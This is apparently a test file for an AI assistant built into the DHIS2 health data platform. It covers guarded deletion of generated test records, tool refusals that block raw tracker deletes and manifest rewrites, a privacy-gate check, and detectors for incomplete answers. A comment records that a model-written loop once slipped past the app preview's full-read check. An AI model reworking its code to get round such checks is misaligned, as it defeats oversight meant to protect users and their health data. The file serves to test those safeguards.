    const names = new Map([['ouA00000001', 'Connaught Hospital'], ['ouB00000001', 'Lumley Hospital']]);
    const send = ctx.tdValue(r2, { displayName: 'Sending facility', valueType: 'TEXT' }, { facility: 'ouA00000001', otherFacility: 'ouB00000001', ouNames: names, seq: 1 });
    const recv = ctx.tdValue(r2, { displayName: 'Receiving facility', valueType: 'TEXT' }, { facility: 'ouA00000001', otherFacility: 'ouB00000001', ouNames: names, seq: 1 });
    const free = new Set(Array.from({ length: 20 }, () => ctx.tdValue(r2, { displayName: 'Comments', valueType: 'TEXT' }, { seq: 1 })));
    const genSrc = String(ctx.executeManageTestData);
    truthy('…a minimum/maximum pair is put in order; facility text fields get real names with the receiving one a different facility; free text is distinct; visit points only on stages whose feature type is POINT',
      dv[0].value === '3.1' && dv[1].value === '9.5' && dv[2].value === '5' && send === 'Connaught Hospital' && recv === 'Lumley Hospital' && free.size > 10
      && /st\.featureType === 'POINT'/.test(genSrc));
    const pd = ctx.tdFillDates(r2, [{ id: 'edd', displayName: 'Estimated due date', valueType: 'DATE' }, { id: 'lmp', displayName: 'Last menstrual period date', valueType: 'DATE' }], '2026-06-01', '2026-11-18');
    const days = (a, b) => Math.round((Date.parse(b) - Date.parse(a)) / 86400000);
    truthy('…a pregnancy is dated from an LMP 8–28 weeks before the visit and a due date 280 days after it (5–14 days made the calculated gestational age 0 weeks)',
      days(pd.lmp, '2026-06-01') >= 56 && days(pd.lmp, '2026-06-01') <= 196 && days(pd.lmp, pd.edd) === 280);
  }

  // 17b. Test-data delete only ever removes records the generator made and nobody touched (user rule, 2026-11-26).
  {
    const R = ctx.tdNotDeletableReason;
    const run = { marker: 'dhis2-ai-test-data', prefix: 'ZZ TEST', at: '2026-11-26T08:00:00Z' };
    const gen = (extra = {}) => ({ trackedEntity: 'teGen000001', attributes: [{ attribute: 'a', value: 'ZZ TEST Cold Chain 1' }], enrollments: [{ enrollment: 'en', program: 'progTD00001', storedBy: 'dhis2-ai-test-data', events: [{ event: 'ev', storedBy: 'dhis2-ai-test-data' }] }], ...extra });
    const legacyRun = { at: '2026-11-26T08:00:00Z' };
    const legacy = (ev) => ({ attributes: [{ value: 'ZZ TEST Nadia' }], enrollments: [{ program: 'progTD00001', createdAt: '2026-11-26T07:59:00', updatedAt: '2026-11-26T07:59:00', events: [ev] }] });
    truthy('test data: a record still exactly as generated may be deleted; one enrolled in another program, or with an enrollment/event a person saved (storedBy = their name), is kept',
      R(gen(), 'progTD00001', run) === null
      && /another program/.test(R(gen({ enrollments: [...gen().enrollments, { program: 'progReal0001', storedBy: 'nurse1', events: [] }] }), 'progTD00001', run) || '')
      && /changed or added to by a person/.test(R(gen({ enrollments: [{ program: 'progTD00001', storedBy: 'dhis2-ai-test-data', events: [{ storedBy: 'dhis2-ai-test-data' }, { storedBy: 'admin' }] }] }), 'progTD00001', run) || ''));
    truthy('…records generated before the marker: kept when a person saved them, updated later, created outside the run, or without the test name prefix',
      R(legacy({ createdAt: '2026-11-26T07:59:10', updatedAt: '2026-11-26T07:59:10' }), 'progTD00001', legacyRun) === null
      && /person/.test(R(legacy({ storedBy: 'admin', createdAt: '2026-11-26T07:59:10', updatedAt: '2026-11-26T07:59:10' }), 'progTD00001', legacyRun) || '')
      && /person/.test(R(legacy({ createdAt: '2026-11-26T07:59:10', updatedAt: '2026-11-26T11:00:00' }), 'progTD00001', legacyRun) || '')
      && /outside the generator/.test(R(legacy({ createdAt: '2026-10-01T10:00:00', updatedAt: '2026-10-01T10:00:00' }), 'progTD00001', legacyRun) || '')
      && /prefix/.test(R({ ...legacy({ createdAt: '2026-11-26T07:59:10', updatedAt: '2026-11-26T07:59:10' }), attributes: [{ value: 'Real Name' }] }, 'progTD00001', legacyRun) || ''));
    // 2.43 ignores a supplied storedBy (stores the importing user): the proof is the generator's own ids + the server-time window.
    const run2 = { marker: 'dhis2-ai-test-data', prefix: 'ZZ TEST', user: 'admin', server_started: '2026-11-26T09:00:00.000', server_finished: '2026-11-26T09:02:00.000', items: { teNew000001: ['enNew000001', 'evNew000001'] } };
    const fresh = (ev = {}) => ({ trackedEntity: 'teNew000001', attributes: [], enrollments: [{ enrollment: 'enNew000001', program: 'progTD00001', storedBy: 'admin', createdAt: '2026-11-26T09:01:00.000', updatedAt: '2026-11-26T09:01:00.000', events: [{ event: 'evNew000001', storedBy: 'admin', createdAt: '2026-11-26T09:01:00.000', updatedAt: '2026-11-26T09:01:00.000', ...ev }] }] });
    const withExtra = fresh(); withExtra.enrollments[0].events.push({ event: 'evPerson001', storedBy: 'admin', createdAt: '2026-11-26T12:00:00.000', updatedAt: '2026-11-26T12:00:00.000' });
    truthy('…on 2.43 (storedBy = the importing user): an untouched record is deletable; one with a visit the generator did not create, updated after the run, or saved by another user is kept',
      R(fresh(), 'progTD00001', run2) === null
      && /added after it was generated/.test(R(withExtra, 'progTD00001', run2) || '')
      && /person/.test(R(fresh({ updatedAt: '2026-11-26T15:30:00.000' }), 'progTD00001', run2) || '')
      && /person/.test(R(fresh({ storedBy: 'nurse1' }), 'progTD00001', run2) || '')
      // live 2026-11-26: an edit seconds after the run (inside the old 10-minute margin) was deleted
      && /person/.test(R(fresh({ updatedAt: '2026-11-26T09:02:00.400' }), 'progTD00001', run2) || ''));
    const stamped2 = fresh(); stamped2.enrollments[0].storedBy = 'dhis2-ai-test-data';
    truthy('…on 2.42 (marker kept): a record whose visit lost the marker to a later save is kept',
      /person/.test(R(stamped2, 'progTD00001', run2) || ''));
    // The whole delete against a stubbed server: a manifest that (tampered or stale) lists a real person.
    const savedF = ctx.safeDhis2Fetch; const dd = ctx.__dhis2(); const keepWa = dd.writeAuth;
    dd.writeAuth = { scope: 'broad', reason: 'verify' };
    const deletedIds = []; let manifestWrite = null;
    const tes = {
      teGen000001: gen(),
      teReal00001: { trackedEntity: 'teReal00001', attributes: [{ value: 'Amina Real' }], enrollments: [{ program: 'progTD00001', storedBy: 'nurse1', events: [{ storedBy: 'nurse1' }] }] },
      teEdit00001: gen({ trackedEntity: 'teEdit00001', enrollments: [{ program: 'progTD00001', storedBy: 'dhis2-ai-test-data', events: [{ storedBy: 'admin' }] }] }),
    };
    for (const [id, t] of Object.entries(tes)) t.trackedEntity = id;
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (p.startsWith('programs/progTD00001')) return { id: 'progTD00001', displayName: 'TD', programType: 'WITH_REGISTRATION', trackedEntityType: { id: 'tetTD000001' }, organisationUnits: [], programStages: [], programTrackedEntityAttributes: [] };
      if (p === 'dataStore') return ['dhis2-ai-extension-testdata'];
      if (p === 'dataStore/dhis2-ai-extension-testdata') return ['progTD00001'];
      if (p === 'dataStore/dhis2-ai-extension-testdata/progTD00001' && !o.method) return { program: 'progTD00001', runs: [{ ...run, trackedEntities: ['teGen000001', 'teReal00001', 'teEdit00001', 'teGone00001'] }] };
      if (p === 'dataStore/dhis2-ai-extension-testdata/progTD00001') { manifestWrite = [o.method, o.body]; return {}; }
      if (p.startsWith('tracker/trackedEntities?')) { const ids = (/trackedEntities=([^&]+)/.exec(p) || [])[1].split(','); return { trackedEntities: ids.filter((i) => tes[i]).map((i) => tes[i]) }; }
      if (p.startsWith('tracker?') && /importStrategy=DELETE/.test(p)) { const ids = o.body.trackedEntities.map((t) => t.trackedEntity); deletedIds.push(...ids); for (const i of ids) delete tes[i]; return { stats: { deleted: ids.length } }; }
      return {};
    };
    try {
      const r = await ctx.executeTool('manage_test_data', { action: 'delete', program_id: 'progTD00001' });
      truthy('…delete reads every listed record back and deletes only the untouched generated one: a real person planted in the manifest and an edited test record are kept and reported, and the manifest keeps only them',
        JSON.stringify(deletedIds) === '["teGen000001"]' && r.deleted_people === 1 && r.already_gone === 1
        && Object.values(r.kept_not_deleted || {}).reduce((a, b) => a + b, 0) === 2
        && manifestWrite && manifestWrite[0] === 'PUT' && JSON.stringify(manifestWrite[1].runs[0].trackedEntities.sort()) === '["teEdit00001","teReal00001"]');
      // A delete DHIS2 fails (play: HTTP 500, a program without its tracked entity type) keeps the ids listed.
      const gen2 = gen(); gen2.trackedEntity = 'teGen000002'; tes.teGen000002 = gen2;
      manifestWrite = null;
      const sdf2 = ctx.safeDhis2Fetch;
      ctx.safeDhis2Fetch = async (p, o = {}) => {
        if (p === 'dataStore/dhis2-ai-extension-testdata/progTD00001' && !o.method) return { program: 'progTD00001', runs: [{ ...run, trackedEntities: ['teGen000002'] }] };
        if (p.startsWith('tracker?') && /importStrategy=DELETE/.test(p)) return { _error: 'DHIS2 API 500: Cannot invoke "org.hisp.dhis.trackedentity.TrackedEntityType.getUid()" because the return value of "org.hisp.dhis.program.Program.getTrackedEntityType()" is null', _status: 500 };
        if (p.startsWith('programs?filter=programType:eq:WITH_REGISTRATION')) return { programs: [{ id: 'progBroke01', displayName: 'Community Care and Referral' }] };
        return sdf2(p, o);
      };
      const r500 = await ctx.executeTool('manage_test_data', { action: 'delete', program_id: 'progTD00001' });
      ctx.safeDhis2Fetch = sdf2;
      truthy('…a delete DHIS2 fails keeps those ids in the list (the tool still knows its records) and names the broken program that makes every tracker import fail',
        r500.deleted_people === 0 && manifestWrite && manifestWrite[0] === 'PUT' && JSON.stringify(manifestWrite[1].runs[0].trackedEntities) === '["teGen000002"]'
        && /Community Care and Referral/.test(r500._diagnosis || '') && /no tracked entity type/.test(r500._diagnosis || ''));
      const raw1 = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'tracker?async=false&importStrategy=DELETE', body: { trackedEntities: [{ trackedEntity: 'teReal00001' }] } });
      const raw2 = await ctx.executeTool('dhis2_query', { method: 'DELETE', path: 'tracker/trackedEntities/teReal00001' });
      const raw3 = await ctx.executeTool('dhis2_query', { method: 'PUT', path: 'dataStore/dhis2-ai-extension-testdata/progTD00001', body: { runs: [{ trackedEntities: ['teReal00001'] }] } });
      truthy('…and dhis2_query cannot delete tracker records or rewrite the test-data manifest (nothing sent)',
        raw1._scope === 'tracker_delete_refused' && (raw2._scope === 'tracker_delete_refused' || raw2._privacy_block) && raw3._scope === 'test_data_manifest_protected' && JSON.stringify(deletedIds) === '["teGen000001"]');
    } finally { ctx.safeDhis2Fetch = savedF; dd.writeAuth = keepWa; }
  }

  // 25. "Step 1 of the build … Still missing from your brief" is a partial delivery, even ending in a plan.
  truthy('partial delivery: "Step 1 of the build … **Still missing from your brief** … Next: I will …" is recognised', ctx.looksLikePartialDelivery('**Step 1 of the build: referral trace added (app v1.1.0)**\n\n**Still missing from your brief**\n\n| Item | Status |\n| Calendar grid | Still a sorted list |\n\n**Next**\n\nI will replace the coordinate list with a boundary map, then the calendar grid.') && ctx.looksLikePartialDelivery('Built the app.\n\nStill missing: the facility map (no facility has coordinates).'));
  truthy('…and the round-10 headers: "**Not built, or not as you asked**", "**Not built or not met**", "### Not done or not verified", "## Dashboard built, with gaps", "### Changed from your request" over a not-built item', ['Installed.\n\n**Not built, or not as you asked**\n- No map', 'Installed.\n\n**Not built or not met**\n- Case overlay', '## Dashboard built, with gaps\n\nLink: x', 'Built.\n\n### Not done or not verified\n- Home map', 'Built.\n\n### Changed from your request\n- **Facility comparison:** not built (1,168 facilities).'].every((x) => ctx.looksLikePartialDelivery(x)));
  truthy('…and the scorecard rerun (2026-11-25): a heading "two requested parts are still not built" and bullets "**X: not built.**", even ending with "Shall I build both now?"; a "Not built by DHIS2" fact or "built" alone is not one',
    ctx.looksLikePartialDelivery('## Immunization Scorecard: v1.1.0 installed, but two requested parts are still not built\n\nText.\n\nShall I build both now?')
    && ctx.looksLikePartialDelivery('Installed v1.1.0.\n\n- **Numerator and denominator on hover or click: not built.** The panel shows only a note.\n- **Trend arrow: not built.**\n\nShall I build both now?')
    && !ctx.looksLikePartialDelivery('## Immunization Scorecard: built and placed\n\n- **Settings:** saved per copy.\n\nWant me to add a third copy?'));
  truthy('…but not a completeness table with a "Missing" column, nor "### Missing data on this server", nor a justified change', !ctx.looksLikePartialDelivery('Dashboard saved.\n\n| Field | Filled | Missing |\n|---|---|---|\n| Phone | 80 | 20 |\n') && !ctx.looksLikePartialDelivery('Built.\n\n### Missing data on this server\n- Delivery method: 0 of 1,982') && !ctx.looksLikePartialDelivery('Built.\n\n### Changed from your request\n- Maps use districts because facilities have no coordinates.'));
  truthy('…and so is a requirement table with a "Gap" column', ctx.looksLikePartialDelivery('## How the installed app compares with your request\n\n| Requirement | Installed v1.1.2 | Gap |\n|---|---|---|\n| Appointment calendar | A sorted list | Not a calendar |\n\nWant me to update it?'));
  truthy('…and so is a "**Not done (you asked for these)**" section', ctx.looksLikePartialDelivery('**TB Follow-up Workspace is installed.**\n\n**Not done (you asked for these)**\n- No summary charts and no facility map\n\nOpen it and tell me what to change.'));
  truthy('…a finished answer that mentions nothing missing is not, nor a "**Missing values**" note', !ctx.looksLikePartialDelivery('The app is installed and every part you asked for is built. Open it at http://x/apps/ai-y.') && !ctx.looksLikePartialDelivery('Installed.\n\n**Missing values** are shown as "Not recorded".\n\n**Not done by the app:** it never changes clinical records.'));

  // 24. Only calls that save count as progress for the turn-end pushes; a same-name object is a real reason to ask.
  truthy('real writes: list / get_source / preview / test_invalid are not writes; add_items / create / generate are', [['manage_dashboards', { action: 'list' }], ['manage_maps', { action: 'list' }], ['manage_line_lists', { action: 'list' }], ['manage_custom_app', { action: 'get_source' }], ['manage_custom_app', { action: 'preview' }], ['manage_test_data', { action: 'test_invalid' }]].every(([t, a]) => !ctx.isRealWriteCall(t, a)) && [['manage_dashboards', { action: 'add_items' }], ['manage_custom_app', { action: 'create' }], ['manage_test_data', { action: 'generate' }], ['manage_line_lists', { action: 'create' }]].every(([t, a]) => ctx.isRealWriteCall(t, a)));
  truthy('…and a dashboard of that name already existing is a real reason to ask', !ctx.looksLikeAskingInsteadOfBuilding('A dashboard named X already exists on this server. I have not changed it. Should I update it or create a new one before I build?'));

  // 22. A plugin placed on a dashboard puts the dashboard link under the answer (nothing else saved).
  {
    vm.runInContext('dhis2.turnDataCheck = null', ctx);
    ctx.noteDataCheckTarget('manage_custom_app', { action: 'place', target: 'dashboard', key: 'ai-x' }, { success: true, dashboard: { success: true, dashboard_id: 'dashPPPPPPP', dashboard_url: 'https://dhis.invalid/dhis-web-dashboard/#/dashPPPPPPP' } });
    const closing = await ctx.finishTurnDataCheck('The plugin is on the demo dashboard.');
    truthy('placed plugin: the dashboard link is added under an answer that lacks it', /Dashboard link:\*\* https:\/\/dhis\.invalid\/dhis-web-dashboard\/#\/dashPPPPPPP/.test(closing));
    vm.runInContext('dhis2.turnDataCheck = null', ctx);
    ctx.noteDataCheckTarget('manage_custom_app', { action: 'place', target: 'dashboard', key: 'ai-x' }, { success: true, dashboard: { dashboard_id: 'dashPPPPPPP', dashboard_url: 'https://dhis.invalid/dhis-web-dashboard/#/dashPPPPPPP' } });
    truthy('…and not repeated when the answer has it', (await ctx.finishTurnDataCheck('Open https://dhis.invalid/dhis-web-dashboard/#/dashPPPPPPP')) === '');
    vm.runInContext('dhis2.turnDataCheck = null', ctx);
    ctx.noteDataCheckTarget('manage_custom_app', { action: 'create', key: 'ai-tb' }, { success: true, key: 'ai-tb', kind: 'app', global_shell_url: 'https://dhis.invalid/apps/ai-tb', launch_url: 'https://dhis.invalid/api/apps/ai-tb/index.html' });
    truthy('installed app: its link is added under an answer that only says "open it from the app menu"', /\*\*App link:\*\* https:\/\/dhis\.invalid\/apps\/ai-tb/.test(await ctx.finishTurnDataCheck('Installed. Open it from the DHIS2 app menu.')));
    vm.runInContext('dhis2.turnDataCheck = null', ctx);
    ctx.noteDataCheckTarget('manage_custom_app', { action: 'update', key: 'ai-tb' }, { success: true, key: 'ai-tb', kind: 'app', global_shell_url: 'https://dhis.invalid/apps/ai-tb' });
    truthy('…not when the answer links it (any form)', (await ctx.finishTurnDataCheck('Open https://dhis.invalid/api/apps/ai-tb/index.html')) === '');
  }

  // 23. Visit indicators counting through a rarely filled field are healed to the stage's most-filled field.
  {
    const saveCov = ctx.dataCheckFieldCoverage, saveFetch = ctx.safeDhis2Fetch;
    const cov = { roKuXYfw1BW: 5, cKBSkBB3Mt4: 9943, PKZPVfAJfHD: 9940 };
    ctx.dataCheckFieldCoverage = async ({ id }) => ({ with_values: cov[id] ?? 0, total: 9945 });
    ctx.safeDhis2Fetch = async (path) => (/^programStages\//.test(path) ? { programStageDataElements: [{ compulsory: false, dataElement: { id: 'roKuXYfw1BW', displayName: 'Gestational age' } }, { compulsory: false, dataElement: { id: 'cKBSkBB3Mt4', displayName: 'Antihypertensive drug given' } }] } : {});
    const inds = [
      { name: 'Women with 4+ ANC visits', filter: 'd2:count(#{edqlbukwRfQ.roKuXYfw1BW}) >= 3' },
      { name: 'Mean gestational age', expression: 'd2:count(#{edqlbukwRfQ.roKuXYfw1BW})' },
    ];
    inds.push({ name: 'Women with 4+ ANC visits (first visit too)', filter: 'd2:hasValue(#{WZbXY0S00lP.roKuXYfw1BW}) && d2:count(#{edqlbukwRfQ.roKuXYfw1BW}) >= 3' });
    const healed = await ctx.piHealSparseVisitCounts(inds, 'WSGAb5XwJ3Y');
    truthy('…"Women with 4+ ANC visits" heals its hasValue and d2:count calls both', inds[2].filter === 'd2:hasValue(#{WZbXY0S00lP.cKBSkBB3Mt4}) && d2:count(#{edqlbukwRfQ.cKBSkBB3Mt4}) >= 3');
    truthy('sparse visit count: "4+ ANC visits" through a field filled on 5 of 9,945 visits now counts the most-filled field', inds[0].filter === 'd2:count(#{edqlbukwRfQ.cKBSkBB3Mt4}) >= 3' && healed.length >= 1 && /5 of 9945/.test(healed[0].replaced));
    truthy('…an indicator that is not about visits is left alone', inds[1].expression === 'd2:count(#{edqlbukwRfQ.roKuXYfw1BW})');
    const keep = [
      { name: 'Missed follow-up visits', filter: "d2:countIfValue(#{edqlbukwRfQ.roKuXYfw1BW}, 'MISSED') > 0" },
      { name: 'Visits with gestational age recorded', filter: 'd2:hasValue(#{edqlbukwRfQ.roKuXYfw1BW})' },
      { name: 'Women with 2+ ANC visits', filter: 'd2:count(#{edqlbukwRfQ.roKuXYfw1BW}) >= 2 && #{edqlbukwRfQ.roKuXYfw1BW} > 20' },
    ];
    await ctx.piHealSparseVisitCounts(keep, 'WSGAb5XwJ3Y');
    truthy('…countIfValue (one value of the field) and "visits with X recorded" keep their field; only the d2:count call itself is changed', /roKuXYfw1BW\}, 'MISSED'/.test(keep[0].filter) && keep[1].filter === 'd2:hasValue(#{edqlbukwRfQ.roKuXYfw1BW})' && keep[2].filter === 'd2:count(#{edqlbukwRfQ.cKBSkBB3Mt4}) >= 2 && #{edqlbukwRfQ.roKuXYfw1BW} > 20');
    ctx.dataCheckFieldCoverage = saveCov; ctx.safeDhis2Fetch = saveFetch;
  }

  // 32. An app that pages through every registration of a big program before showing anything is refused at preview.
  {
    const saveF = ctx.safeDhis2Fetch;
    const total = { value: 50028 };
    ctx.safeDhis2Fetch = async (p) => (/^tracker\/enrollments\?program=/.test(p) ? { pager: { total: total.value } } : {});
    const code = "async function fetchAll(engine, resource, params) { const out = []; let page = 1, pageCount = 1; do { const r = await engine.query({ r: { resource, params: { ...params, page, pageSize: 250, totalPages: true } } }); out.push(...r.r.enrollments); pageCount = r.r.pager.pageCount; page++; } while (page <= pageCount); return out; }\nconst load = (engine) => fetchAll(engine, 'tracker/enrollments', { program: 'ur1Edk5Oe2n' });";
    const big = await ctx.customAppFullReadProblem(code, { ur1Edk5Oe2n: 'programs' });
    total.value = 120;
    const small = await ctx.customAppFullReadProblem(code, { ur1Edk5Oe2n: 'programs' });
    total.value = 50028;
    const told = await ctx.customAppFullReadProblem(code + "\nconst NOTE = 'Exporting every record may take several minutes';", { ur1Edk5Oe2n: 'programs' });
    truthy('full read of 50,028 registrations before the first render is refused at preview (with the count)', /50,028 registrations of program ur1Edk5Oe2n/.test(big?._error || ''));
    truthy('…120 registrations are fine, and so is a full read the user is told may take minutes', small === null && told === null);
    // Child Vaccination app (2026-11-25): for(;;) with a break on pageCount slipped through once,
    // while the same read in a while(page <= pageCount) loop was refused twice and the model gave up.
    const forever = "async function pages(engine, params) { let page = 1; for (;;) { const r = await engine.query({ x: { resource: 'tracker/enrollments', params: { ...params, page, pageSize: 250, totalPages: true } } }); all.push(...r.x.enrollments); if (page >= r.x.pager.pageCount) break; page += 1; } }";
    const progressive = "async function pages(engine, params, onChunk) { let page = 1; for (;;) { const r = await engine.query({ x: { resource: 'tracker/enrollments', params: { ...params, page, pageSize: 250, totalPages: true } } }); onChunk(r.x.enrollments, page, r.x.pager); if (page >= r.x.pager.pageCount) break; page += 1; } }\nconst Total = ({ pager }) => pager.total;";
    const appendSetter = code.replace('out.push(...r.r.enrollments);', 'setRows((prev) => [...prev, ...r.r.enrollments]);') + "\nconst shown = (pager) => `Loaded ${n} of ${pager.total}`;";
    const f1 = await ctx.customAppFullReadProblem(forever, { ur1Edk5Oe2n: 'programs' });
    const f2 = await ctx.customAppFullReadProblem(progressive, { ur1Edk5Oe2n: 'programs' });
    const f3 = await ctx.customAppFullReadProblem(appendSetter, { ur1Edk5Oe2n: 'programs' });
    truthy('…a for(;;) loop that breaks on pageCount is the same full read (refused); one that fills the screen page by page with the total shown (per-page callback or appending setter) is accepted, and the refusal names that option',
      /50,028 registrations/.test(f1?._error || '') && /PAGE BY PAGE/.test(f1.problems[0].message) && /not a reason to stop and ask/.test(f1._hint) && f2 === null && f3 === null);
    ctx.safeDhis2Fetch = saveF;
  }

  // 31. A facility comparison too big for an overall row keeps its level (drop the overall row or sort a chart).
  {
    const saveF = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async () => ({ organisationUnits: Array.from({ length: 1170 }, (_, i) => ({ id: `ou${String(i).padStart(9, '0')}` })) });
    const r = await ctx.applyOverallRow({ overall_row: true, org_units: ['ImspTQPwCqd', 'LEVEL-4'] });
    truthy('overall row over 1,170 facilities: refused, with the level kept (drop overall_row / sorted chart), not "use a higher level"', /1170 level-4 units/.test(r?._error || '') && /drop overall_row/.test(r?._hint || '') && !/use a higher level\.?$/.test(r?._error || ''));
    ctx.safeDhis2Fetch = saveF;
  }

  // 29. Internal reads that parse a program's stages / data elements / attributes are never cut to the model-size limit.
  {
    const offenders = [];
    for (const f of fs.readdirSync(path.join(ROOT, 'src')).filter((x) => x.endsWith('.js'))) {
      const src = fs.readFileSync(path.join(ROOT, 'src', f), 'utf8');
      for (const m of src.matchAll(/safeDhis2Fetch\(\s*`[^`]*(?:programStageDataElements|programStages(?:%5B|\[)|programTrackedEntityAttributes)[^`]*`\s*\)/g)) offenders.push(`${f}:${src.slice(0, m.index).split('\n').length}`);
    }
    truthy(`program-structure reads pass noTruncate (a cut response drops programStages: "Stages: .") ${offenders.join(', ')}`, offenders.length === 0);
  }

  // 28. count_records: an analytics 0 is explained with live counts (records not in analytics yet / at other units / none).
  {
    const saveC = ctx.countViaTracker, saveF = ctx.safeDhis2Fetch;
    const run = async (here, all, extra = {}) => { ctx.countViaTracker = async (p, ou) => ({ count: ou === 'USER_ORGUNIT' ? all : here }); ctx.safeDhis2Fetch = async () => ({ lastAnalyticsTableSuccess: '2026-09-16T09:34:40' }); return ctx.countRecordsZeroContext('cfb6Ovd3kyL', 'N0WVesLwWK2', { record_type: 'events', ...extra }, false, 'Laboratory', 'Test facility', 'All stages'); };
    const stale = await run(14, 14), elsewhere = await run(0, 14, { include_children: true }), none = await run(0, 0);
    truthy('zero count: records at the unit but not in analytics → "live record(s) … tables do not hold them yet (last run …)"', /14 live record\(s\) exist at Test facility/.test(stale._zero_note || '') && /2026-09-16/.test(stale._zero_note));
    truthy('…records only at other units → "do NOT say the program has no data", and include_children not applied is said', /14 live record\(s\): do NOT say the program has no data/.test(elsewhere._zero_note || '') && /include_children was NOT applied/.test(elsewhere._scope_note || ''));
    truthy('…no live records anywhere → says so', /no data yet/.test(none._zero_note || ''));
    let seenType = null;
    ctx.countViaTracker = async (p, ou, a) => { seenType = a.record_type; return { count: 0 }; };
    await ctx.countRecordsZeroContext('cfb6Ovd3kyL', 'N0WVesLwWK2', { record_type: 'tracked_entities', date_after: '2026-01-01' }, false, 'Laboratory', 'Test facility', 'All stages');
    truthy('…people are checked through enrollments (dates and status apply there), not trackedEntities', seenType === 'enrollments');
    ctx.countViaTracker = saveC; ctx.safeDhis2Fetch = saveF;
  }

  // 27. The Claude Code test bridge must look like a cloud model (a *.local host switches the privacy gate off).
  {
    const host = (require('fs').readFileSync(require('path').join(__dirname, 'claude-code-bridge.js'), 'utf8').match(/const BRIDGE_HOST = '([^']+)'/) || [])[1];
    truthy(`test bridge host "${host}" is treated as a cloud model (privacy gate on)`, !!host && !ctx.isLocalProviderUrl(`http://${host}/v1`));
  }

  // 26. Line-list "no value" / "has a value" conditions on any type; IN:NV (returns nothing on 2.42) becomes EQ:NV.
  {
    const nf = (f, vt, extra = {}) => ctx.lineListNormalizeFilter(f, { name: 'X', valueType: vt, ...extra }, new Map());
    const r = await Promise.all([nf({ operator: 'EMPTY' }, 'DATE'), nf({ operator: 'not_empty' }, 'NUMBER'), nf('EQ:NV', 'TEXT'), nf('IN:NV', 'TEXT'), nf({ operator: 'IS_NULL' }, 'TEXT', { optionSetId: 'osAAAAAAAAA' }), nf('NE:NV', 'DATE')]);
    truthy('line list: EMPTY / NOT_EMPTY / EQ:NV / IN:NV are saved as EQ:NV / NE:NV on dates, numbers, text and option sets', r.map(x => x.filter).join(',') === 'EQ:NV,NE:NV,EQ:NV,EQ:NV,EQ:NV,NE:NV');
    const b = await Promise.all([nf({ operator: 'NE', value: true }, 'BOOLEAN'), nf({ operator: 'EQ', value: 'yes' }, 'BOOLEAN'), nf({ operator: 'NE', value: true }, 'TRUE_ONLY'), nf({ operator: 'GE', value: '2025-06-01T10:00' }, 'DATE')]);
    truthy('line list: Yes/No "NE true" is saved as IN:0 (not IN:1), TRUE_ONLY "not true" as EQ:NV, EQ yes as IN:1; a date with a time is refused', b[0].filter === 'IN:0' && b[1].filter === 'IN:1' && b[2].filter === 'EQ:NV' && /not a yyyy-MM-dd date/.test(b[3]._error || ''));
  }

  // 21. Line-list filters on a DATE field take comparison operators; text still does not.
  {
    const dateF = await ctx.lineListNormalizeFilter({ operator: 'GE', value: '2025-06-01' }, { name: 'Result date', valueType: 'DATE' }, new Map());
    const rangeF = await ctx.lineListNormalizeFilter('GE:2025-06-01:LE:2025-12-31', { name: 'Result date', valueType: 'DATE' }, new Map());
    const textF = await ctx.lineListNormalizeFilter({ operator: 'GE', value: '2025-06-01' }, { name: 'Result note', valueType: 'TEXT' }, new Map());
    const badF = await ctx.lineListNormalizeFilter({ operator: 'GE', value: 'last week' }, { name: 'Result date', valueType: 'DATE' }, new Map());
    truthy('line list: GE / a GE+LE range on a DATE field is encoded', dateF.filter === 'GE:2025-06-01' && rangeF.filter === 'GE:2025-06-01:LE:2025-12-31');
    truthy('…GE on text is still refused, and a date filter needs a yyyy-MM-dd value', /not valid for text/.test(textF._error || '') && /not a yyyy-MM-dd date/.test(badF._error || ''));
  }

  // 20. "Home location" as TEXT becomes COORDINATE (it is meant for a map); an address stays text.
  {
    const a20 = { action: 'create_program', program_name: 'ZZ heal', program_type: 'WITH_REGISTRATION', program_attributes: [{ name: 'Home location', value_type: 'TEXT' }, { name: 'Home address', value_type: 'TEXT' }, { name: 'GPS position', value_type: 'TEXT' }], program_stages: [{ name: 'S', data_elements: [{ name: 'X', value_type: 'TEXT' }] }] };
    ctx.validateAndHealProgramInput(a20);
    eq('program attributes: "Home location" and "GPS position" become COORDINATE, "Home address" stays TEXT', a20.program_attributes.map((x) => x.value_type), ['COORDINATE', 'TEXT', 'COORDINATE']);
  }

  // 19. A build request answered with "not installed yet … is a 30-day interval right?" is asking instead of building.
  truthy('asking instead of building: "I have not installed the app yet … Is that right?" is recognised', ctx.looksLikeAskingInsteadOfBuilding('I have not installed the app yet. What the full build needs before I write it: 1. Expected interval: the default is 30 days. Is that right?'));
  truthy('…a blocker ("the program does not exist") or a finished build is not', !ctx.looksLikeAskingInsteadOfBuilding('I have not built anything: the program does not exist on this server. Which program should I use?') && !ctx.looksLikeAskingInsteadOfBuilding('Installed and tested. Open it at https://x/apps/ai-tb.'));

  // 16. A final answer listing requested parts as not built is recognised (one push to build them).
  truthy('partial delivery: "Not built yet (the request is only partly done)" is recognised', ctx.looksLikePartialDelivery('Installed v1.0.0.\n\n**Not built yet (the request is only partly done)**\n- Summary charts\n- Facility map'));
  truthy('…"What is missing from your request … Tell me which first?" is recognised too (the user asked for all of it)', ctx.looksLikePartialDelivery('Installed, but only part of what you asked for is built.\n### What is missing from your request\n- No charts\nTell me which first?'));
  truthy('…a complete answer, or one that ends by asking the user, is not', !ctx.looksLikePartialDelivery('Built and installed. Every part works: charts, map, queue.') && !ctx.looksLikePartialDelivery('Part of it is not built yet. Should I use a new prefix?'));

  // 15. A text option code compared with a bare number is quoted (SQL 42883 otherwise).
  {
    const stages = new Map([['PFDfvmGpsR3', { displayName: 'Care at birth', programStageDataElements: [{ dataElement: { id: 'V5PR8Kw8ZnC', displayName: 'Pregnancy outcome', valueType: 'TEXT' } }, { dataElement: { id: 'NumDe000001', displayName: 'Weight', valueType: 'NUMBER' } }] }]]);
    const pi = { name: 'Stillbirths', analyticsType: 'ENROLLMENT', aggregationType: 'COUNT', expression: 'V{enrollment_count}', filter: '#{PFDfvmGpsR3.V5PR8Kw8ZnC} == 0 && #{PFDfvmGpsR3.NumDe000001} > 2500' };
    ctx.piAnalyticsRuntimeTraps(pi, stages, 43);
    eq('indicator: a text option code compared with a bare number is quoted; numbers stay numbers', pi.filter, "#{PFDfvmGpsR3.V5PR8Kw8ZnC} == '0' && #{PFDfvmGpsR3.NumDe000001} > 2500");
  }

  // 13. Plan-first only when a plan is asked for BEFORE building, in one sentence.
